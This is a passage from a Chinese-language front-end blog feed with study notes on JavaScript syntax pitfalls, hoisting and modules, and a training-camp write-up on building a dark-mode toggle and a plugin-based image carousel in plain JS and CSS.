中的一些特别之处：</p><ol><li>除法和正则表达式冲突问题。JavaScript 不但支持除法运算符“ / ”和“ /= ”，还支持用斜杠括起来的正则表达式“ /abc/ ”。所以解决方案是定义两组词法，然后靠语法分析传一个标志给词法分析器，让它来决定使用哪一套词法。</li><li>字符串模板。理论上，“ ${ } ”内部可以放任何 JavaScript 表达式代码，而这些代码是以“ } ” 结尾的，也就是说，这部分词法不允许出现“ } ”运算符。</li></ol><h3 id="编译原理"><a href="#编译原理" class="headerlink" title="编译原理"></a>编译原理</h3><p>四个步骤：</p><ul><li>定义四则运算：产出四则运算的词法定义和语法定义。语法定义的核心思想为几种结构的组合产生一个新的结构。词法定义大概如下：<ul><li>Token<ul><li>Number: <code>1</code> <code>2</code> <code>3</code> <code>4</code> <code>5</code> <code>6</code> <code>7</code> <code>8</code> <code>9</code> <code>0</code> 的组合</li><li>Operator: <code>+</code> 、<code>-</code>、 <code>*</code>、 <code>/</code> 之一</li></ul></li><li>Whitespace: <code>&lt;sp&gt;</code></li><li>LineTerminator：<code>&lt;LF&gt; &lt;CR&gt;</code></li></ul></li><li>词法分析：把输入的字符串流变成 token。</li><li>语法分析：把 token 变成抽象语法树 AST。</li><li>解释执行：后序遍历 AST，执行得出结果。</li></ul><h2 id="不写分号需要注意的情况"><a href="#不写分号需要注意的情况" class="headerlink" title="不写分号需要注意的情况"></a>不写分号需要注意的情况</h2><ol><li><p>以括号开头的语句。这段代码看似两个独立执行的函数表达式，但是其实第三组括号被理解为传参，导致抛出错误。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;)()  <span class="comment">/* 这里没有被自动插入分号 */</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure></li><li><p>以数组开头的语句。这段代码本意是一个变量 a 赋值，然后对一个数组执行 forEach，但是因为没有自动插入分号，被理解为下标运算符和逗号表达式，这个例子甚至不会抛出错误。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = [[]]  <span class="comment">/* 这里没有被自动插入分号 */</span></span><br><span class="line">[<span class="number">3</span>, <span class="number">2</span>, <span class="number">1</span>, <span class="number">0</span>].forEach(<span class="function"><span class="params">e</span> =&gt;</span> <span class="built_in">console</span>.log(e))</span><br></pre></td></tr></table></figure></li><li><p>以正则表达式开头的语句。这段代码本意是声明三个变量，然后测试一个字符串中是否含有字母 a，但是因为没有自动插入分号，正则的第一个斜杠被理解成了除号，后面的意思就都变了。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> x = <span class="number">1</span>, g = &#123;<span class="attr">test</span>:<span class="function">()=&gt;</span><span class="number">0</span>&#125;, b = <span class="number">1</span>  <span class="comment">/* 这里没有被自动插入分号 */</span></span><br><span class="line">/(a)/g.test(<span class="string">&quot;abc&quot;</span>)</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">RegExp</span>.$1)</span><br></pre></td></tr></table></figure></li><li><p>以 Template 开头的语句。这段代码本意是声明函数 f，然后赋值给 g，再测试 Template 中是否含有字母 a。但是因为没有自动插入分号，函数 f 被认为跟 Template 一体的，进而被莫名其妙地执行了一次。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">var</span> g = f  <span class="comment">/* 这里没有被自动插入分号 */</span></span><br><span class="line"><span class="string">`Template`</span>.match(<span class="regexp">/(a)/</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">RegExp</span>.$1)</span><br></pre></td></tr></table></figure></li></ol><h2 id="语法"><a href="#语法" class="headerlink" title="语法"></a>语法</h2><h3 id="脚本和模块"><a href="#脚本和模块" class="headerlink" title="脚本和模块"></a>脚本和模块</h3><p>现代浏览器可以支持用 script 标签引入模块或者脚本。如果要引入模块，必须给 script 标签添加 type=“module”；如果引入脚本，则不需要 type。</p><p>脚本中可以包含语句。模块中可以包含三种内容：import 声明，export 声明和语句。</p><p><strong>import 声明：</strong></p><ol><li><p>直接 import 一个模块，只是保证了这个模块代码被执行，引用它的模块是无法获得它的任何信息的。</p></li><li><p>带 from 的 import 意思是引入模块中的一部分信息，可以把它们变成本地的变量。有三种方法：</p><ul><li><code>import x from &quot;./a.js&quot;</code> 引入模块中导出的默认值。</li><li><code>import &#123;a as x, modify&#125; from &quot;./a.js&quot;;</code> 引入模块中的变量。</li><li><code>import * as x from &quot;./a.js&quot;</code> 把模块中所有的变量以类似对象属性的方式引入。</li></ul><p>语法要求不带 as 的默认值永远在最前。</p></li></ol><p><strong>export 声明：</strong></p><ol><li>独立使用 export 声明。</li><li>直接在声明型语句前添加 export 关键字：<ul><li>var、let、const</li><li>function (含 async 和 generator)</li><li>class</li></ul></li><li>跟 default 联合使用。export default 表示导出一个默认变量值，它可以用于 function 和 class。这里导出的变量是没有名称的，可以使用<code>import x from &quot;./a.js&quot;</code>这样的语法，在模块中引入。</li></ol><h3 id="预处理"><a href="#预处理" class="headerlink" title="预处理"></a>预处理</h3><p>JavaScript 执行前，会对脚本、模块和函数体中的语句进行预处理。预处理过程将会提前处理 var、函数声明、class、const 和 let 这些语句，以确定其中变量的意义。</p><ol><li><p><strong>var 声明</strong></p><ul><li>永远作用于脚本、模块和函数体这个级别，在预处理阶段，不关心赋值的部分，只管在当前作用域声明这个变量。</li><li>var 的作用能够<strong>穿透一切语句结构</strong>，它只认脚本、模块和函数体三种语法结构。</li></ul><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="number">1</span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(a);</span><br><span class="line">    <span class="keyword">if</span>(<span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line">foo(); <span class="comment">// undefined</span></span><br></pre></td></tr></table></figure></li><li><p><strong>function 声明</strong>。与 var 不同之处在于 function 声明不但在作用域中加入变量，还会给它赋值。</p></li><li><p><strong>class 声明</strong></p><ul><li>在 class 声明之前使用 class 名，会抛错。</li><li>class 声明也是会被预处理的，它会在作用域中创建变量，并且要求访问它时抛出错误。</li><li>class 的声明作用不会穿透 if 等语句结构，所以只有写在全局环境才会有声明作用</li></ul></li></ol><h3 id="指令序言机制"><a href="#指令序言机制" class="headerlink" title="指令序言机制"></a>指令序言机制</h3><p><code>&quot;use strict&quot;</code>是 JavaScript 标准中规定的唯一一种指令序言，但是设计指令序言的目的是留给 JS 的引擎和实现者一些统一的表达方式，在静态扫描时指定 JS 代码的一些特性。</p><p>JavaScript 的指令序言是只有一个字符串直接量的表达式语句，它只能出现在脚本、模块和函数体的最前面。</p><h3 id="表达式语句"><a href="#表达式语句" class="headerlink" title="表达式语句"></a>表达式语句</h3><p>由运算符连接变量或者直接量构成的表达式。</p><h1 id="综合应用"><a href="#综合应用" class="headerlink" title="综合应用"></a>综合应用</h1><h2 id="性能"><a href="#性能" class="headerlink" title="性能"></a>性能</h2><p>性能问题最重要的几个点是：</p><ul><li>页面加载性能；!important</li><li>动画与操作性能；</li><li>内存、电量消耗。</li></ul><p><img src="https://i.loli.net/2021/10/11/yfdHPw4nNZrSWlB.png" alt="image.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;HTML&quot;&gt;&lt;a href=&quot;#HTML&quot; class=&quot;headerlink&quot; title=&quot;HTML&quot;&gt;&lt;/a&gt;HTML&lt;/h1&gt;&lt;h2 id=&quot;链接&quot;&gt;&lt;a href=&quot;#链接&quot; class=&quot;headerlink&quot; title=&quot;链接&quot;&gt;&lt;/a&gt;链接&lt;/h</summary>
      
    
    
    
    <category term="阅读笔记" scheme="https://asura1211.github.io/categories/%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/"/>
    
    
    <category term="前端" scheme="https://asura1211.github.io/tags/%E5%89%8D%E7%AB%AF/"/>
    
  </entry>
  
  <entry>
    <title>【学习笔记】— — 字节青训营</title>
    <link href="https://asura1211.github.io/2021/08/14/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E5%AD%97%E8%8A%82%E9%9D%92%E8%AE%AD%E8%90%A5/"/>
    <id>https://asura1211.github.io/2021/08/14/%E3%80%90%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E3%80%91%E2%80%94%20%E2%80%94%20%E5%AD%97%E8%8A%82%E9%9D%92%E8%AE%AD%E8%90%A5/</id>
    <published>2021-08-14T15:04:54.000Z</published>
    <updated>2021-11-26T04:52:36.058Z</updated>
    
    <content type="html"><![CDATA[<h1 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h1><h1 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h1><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><h2 id="Case：写一段JS，控制网页实现切换深浅色两种浏览模式"><a href="#Case：写一段JS，控制网页实现切换深浅色两种浏览模式" class="headerlink" title="Case：写一段JS，控制网页实现切换深浅色两种浏览模式"></a>Case：写一段JS，控制网页实现切换深浅色两种浏览模式</h2><h3 id="方法一、JS改变DOM样式"><a href="#方法一、JS改变DOM样式" class="headerlink" title="方法一、JS改变DOM样式"></a>方法一、JS改变DOM样式</h3><p><a href="https://code.h5jun.com/fapaz/edit?js,output">https://code.h5jun.com/fapaz/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> btn = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;modeBtn&#x27;</span>);</span><br><span class="line">btn.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function">(<span class="params">e</span>) =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">const</span> body = <span class="built_in">document</span>.body;</span><br><span class="line">  <span class="keyword">if</span>(body.className !== <span class="string">&#x27;night&#x27;</span>) &#123;</span><br><span class="line">    body.className = <span class="string">&#x27;night&#x27;</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    body.className = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="方法二、"><a href="#方法二、" class="headerlink" title="方法二、"></a>方法二、</h3><p>注意到这只是纯样式的改变，因此考虑只用CSS。<a href="https://code.h5jun.com/qofoz/edit?js,output">https://code.h5jun.com/qofoz/edit?js,output</a></p><figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-id">#modeCheckBox</span> &#123;</span><br><span class="line">  <span class="attribute">display</span>: none;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#modeCheckBox</span><span class="selector-pseudo">:checked</span> + <span class="selector-class">.content</span> &#123;</span><br><span class="line">  <span class="attribute">background-color</span>: black;</span><br><span class="line">  <span class="attribute">color</span>: white;</span><br><span class="line">  <span class="attribute">transition</span>: all <span class="number">1s</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#modeBtn</span> &#123;</span><br><span class="line">  <span class="attribute">font-size</span>: <span class="number">2rem</span>;</span><br><span class="line">  <span class="attribute">float</span>: right;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#modeBtn</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;🌞&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-id">#modeCheckBox</span><span class="selector-pseudo">:checked</span> + <span class="selector-class">.content</span> <span class="selector-id">#modeBtn</span><span class="selector-pseudo">::after</span> &#123;</span><br><span class="line">  <span class="attribute">content</span>: <span class="string">&#x27;🌜&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="思考"><a href="#思考" class="headerlink" title="思考"></a>思考</h3><ul><li>HTML/CSS/JS各司其责 </li><li>应当避免不必要的由JS直接操作样式</li><li>可以用 class 来表示状态</li><li>纯展示类交互寻求零 JS 方案</li></ul><h2 id="Case：原生JS实现轮播图"><a href="#Case：原生JS实现轮播图" class="headerlink" title="Case：原生JS实现轮播图"></a>Case：原生JS实现轮播图</h2><p><strong>组件</strong>：Web 页面上抽出来一个个包含模板（HTML）、功能（JS）和样式（CSS）的单元。好的组件具备封装性、正确性、扩展性、复用性。</p><h3 id="方法一"><a href="#方法一" class="headerlink" title="方法一"></a>方法一</h3><p>API 设计应保证原子操作，职责单一，满足灵活性。<a href="https://code.h5jun.com/tifuf/edit?js,output">https://code.h5jun.com/tifuf/edit?js,output</a></p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container</span><br><span class="line">    .querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.container</span><br><span class="line">      .querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>)</span><br><span class="line">      % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>);</span><br><span class="line">slider.slideTo(<span class="number">1</span>);</span><br></pre></td></tr></table></figure><h3 id="方法二"><a href="#方法二" class="headerlink" title="方法二"></a>方法二</h3><p>使用自定义事件来解耦。<a href="https://code.h5jun.com/reba/3/edit?js,output">https://code.h5jun.com/reba/3/edit?js,output</a> 缺点：封装性不太好，constructor过长。</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, cycle = <span class="number">3000</span></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container.querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.cycle = cycle;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> controller = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slide-list__control&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(controller)&#123;</span><br><span class="line">      <span class="keyword">const</span> buttons = controller.querySelectorAll(<span class="string">&#x27;.slide-list__control-buttons, .slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="keyword">const</span> idx = <span class="built_in">Array</span>.from(buttons).indexOf(evt.target);</span><br><span class="line">        <span class="keyword">if</span>(idx &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">          <span class="built_in">this</span>.slideTo(idx);</span><br><span class="line">          <span class="built_in">this</span>.stop();</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;);</span><br><span class="line">      </span><br><span class="line">      controller.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.start();</span><br><span class="line">      &#125;);</span><br><span class="line">      </span><br><span class="line">      <span class="built_in">this</span>.container.addEventListener(<span class="string">&#x27;slide&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="keyword">const</span> idx = evt.detail.index</span><br><span class="line">        <span class="keyword">const</span> selected = controller.querySelector(<span class="string">&#x27;.slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(selected) selected.className = <span class="string">&#x27;slide-list__control-buttons&#x27;</span>;</span><br><span class="line">        buttons[idx].className = <span class="string">&#x27;slide-list__control-buttons--selected&#x27;</span>;</span><br><span class="line">      &#125;)</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 左侧按钮</span></span><br><span class="line">    <span class="keyword">const</span> previous = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slide-list__previous&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(previous)&#123;</span><br><span class="line">      previous.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.stop();</span><br><span class="line">        <span class="built_in">this</span>.slidePrevious();</span><br><span class="line">        <span class="built_in">this</span>.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 右侧按钮</span></span><br><span class="line">    <span class="keyword">const</span> next = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slide-list__next&#x27;</span>);</span><br><span class="line">    <span class="keyword">if</span>(next)&#123;</span><br><span class="line">      next.addEventListener(<span class="string">&#x27;click&#x27;</span>, <span class="function"><span class="params">evt</span> =&gt;</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.stop();</span><br><span class="line">        <span class="built_in">this</span>.slideNext();</span><br><span class="line">        <span class="built_in">this</span>.start();</span><br><span class="line">        evt.preventDefault();</span><br><span class="line">      &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> selected = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> detail = &#123;<span class="attr">index</span>: idx&#125;</span><br><span class="line">    <span class="keyword">const</span> event = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;slide&#x27;</span>, &#123;<span class="attr">bubbles</span>:<span class="literal">true</span>, detail&#125;)</span><br><span class="line">    <span class="built_in">this</span>.container.dispatchEvent(event)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">let</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">let</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.stop();</span><br><span class="line">    <span class="built_in">this</span>._timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span><span class="built_in">this</span>.slideNext(), <span class="built_in">this</span>.cycle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="built_in">this</span>._timer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> slider = <span class="keyword">new</span> Slider(<span class="string">&#x27;my-slider&#x27;</span>);</span><br><span class="line">slider.start();</span><br></pre></td></tr></table></figure><h3 id="方法三（优化）"><a href="#方法三（优化）" class="headerlink" title="方法三（优化）"></a>方法三（优化）</h3><p>将控制元素抽象成插件，插件与组件间通过<strong>依赖注入</strong>方式建立联系。<a href="https://code.h5jun.com/weru/3/edit?js,output">https://code.h5jun.com/weru/3/edit?js,output</a> </p><p>优点：可提升扩展性。</p><p>缺点：当想取消小圆点时，除了注释 js 代码，还需修改 html 中代码。(只解耦了 js 部分)</p><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Slider</span></span>&#123;</span><br><span class="line">  <span class="function"><span class="title">constructor</span>(<span class="params">id, cycle = <span class="number">3000</span></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container = <span class="built_in">document</span>.getElementById(id);</span><br><span class="line">    <span class="built_in">this</span>.items = <span class="built_in">this</span>.container.querySelectorAll(<span class="string">&#x27;.slider-list__item, .slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="built_in">this</span>.cycle = cycle;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">registerPlugins</span>(<span class="params">...plugins</span>)</span>&#123;</span><br><span class="line">    plugins.forEach(<span class="function"><span class="params">plugin</span> =&gt;</span> plugin(<span class="built_in">this</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItem</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.container.querySelector(<span class="string">&#x27;.slider-list__item--selected&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> selected</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">getSelectedItemIndex</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">Array</span>.from(<span class="built_in">this</span>.items).indexOf(<span class="built_in">this</span>.getSelectedItem());</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideTo</span>(<span class="params">idx</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> selected = <span class="built_in">this</span>.getSelectedItem();</span><br><span class="line">    <span class="keyword">if</span>(selected)&#123; </span><br><span class="line">      selected.className = <span class="string">&#x27;slider-list__item&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">const</span> item = <span class="built_in">this</span>.items[idx];</span><br><span class="line">    <span class="keyword">if</span>(item)&#123;</span><br><span class="line">      item.className = <span class="string">&#x27;slider-list__item--selected&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span> detail = &#123;<span class="attr">index</span>: idx&#125;</span><br><span class="line">    <span class="keyword">const</span> event = <span class="keyword">new</span> CustomEvent(<span class="string">&#x27;slide&#x27;</span>, &#123;<span class="attr">bubbles</span>:<span class="literal">true</span>, detail&#125;)</span><br><span class="line">    <span class="built_in">this</span>.container.dispatchEvent(event)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slideNext</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> nextIdx = (currentIdx + <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(nextIdx);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">slidePrevious</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">const</span> currentIdx = <span class="built_in">this</span>.getSelectedItemIndex();</span><br><span class="line">    <span class="keyword">const</span> previousIdx = (<span class="built_in">this</span>.items.length + currentIdx - <span class="number">1</span>) % <span class="built_in">this</span>.items.length;</span><br><span class="line">    <span class="built_in">this</span>.slideTo(previousIdx);  </span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">addEventListener</span>(<span class="params">type, handler</span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.container.addEventListener(type, handler)</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">start</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.stop();</span><br><span class="line">    <span class="built_in">this</span>._timer = <span class="built_in">setInterval</span>(<span class="function">()=&gt;</span><span class="built_in">this</span>.slideNext(), <span class="built_in">this</span>.cycle);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="title">stop</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="built_in">clearInterval</span>(<span class="built_in">this</span>._timer);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 插件注册</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">pluginController</span>(<span class="params">slider</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">const</span> controller = slider.container.querySelector(<span class="string">&#x27;.slide-list__control&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span>(controller)&#123;</span><br><span class="line">    <span class="keyword">const</span> buttons = controller.querySelectorAll(<span class="string">&#x27;.slide-list__control-buttons, .slide-list__control-buttons--selected&#x27;</span>);</span><br><span class="line">    controller.addEventListener(<span class="string">&#x27;mouseover&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">      <span class="keyword">const</span> idx = <span class="built_in">Array</span>.from(buttons).indexOf(evt.target);</span><br><span class="line">      <span class="keyword">if</span>(idx &gt;= <span class="number">0</span>)&#123;</span><br><span class="line">        slider.slideTo(idx);</span><br><span class="line">        slider.stop();</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    controller.addEventListener(<span class="string">&#x27;mouseout&#x27;</span>, <span class="function"><span class="params">evt</span>=&gt;</span>&#123;</span><br><span class="line">      slider.start();</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">    slider.addEventListener(<span class="string">&#x27;slide&#x27;</span>, <span 